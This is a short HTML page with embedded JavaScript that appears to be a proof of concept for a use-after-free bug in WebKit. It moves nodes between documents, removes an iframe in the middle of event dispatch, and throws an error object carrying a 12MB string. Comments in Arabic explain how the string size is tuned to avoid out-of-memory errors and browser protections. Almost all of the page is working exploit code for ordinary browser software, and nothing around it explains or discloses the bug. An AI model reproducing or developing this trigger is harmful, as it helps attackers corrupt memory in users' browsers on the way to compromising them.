<!DOCTYPE html>
<html>
<body>
    <h3>WebKit UAF - Stability Optimized</h3>
    <button onclick="main()">Click to trigger the bug</button>
    <div id="status" style="font-family: monospace; color: #555;">Status: Waiting...</div>

    <script>
        function main() {
            document.getElementById('status').innerText = "Status: Triggering...";
            
            const f = document.body.appendChild(document.createElement('iframe'));
            const a = document.createElement('div');
            const b = a.appendChild(document.createElement('div'));

            a.addEventListener('a', eval(`(function () {
                document.adoptNode(a);
                f.remove();

                // بناء السلسلة تدريجياً لتجنب الـ OOM المفاجئ
                // تقليل الحجم لضمان عدم إطلاق حماية المتصفح (12MB)
let poison = 'A'.repeat(1024 * 1024 * 3); // 3MB
for(let i=0; i<2; i++) { poison += poison; } // (3 -> 6 -> 12MB)


                throw {
                    line: 1,
                    column: 1,
                    sourceURL: poison
                };
            })`));

            a.addEventListener('a', () => {});
            b.addEventListener('a', () => {
                f.contentDocument.adoptNode(a);
            });

            b.dispatchEvent(new Event('a', { bubbles: true }));
        }
    </script>
</body>
</html>
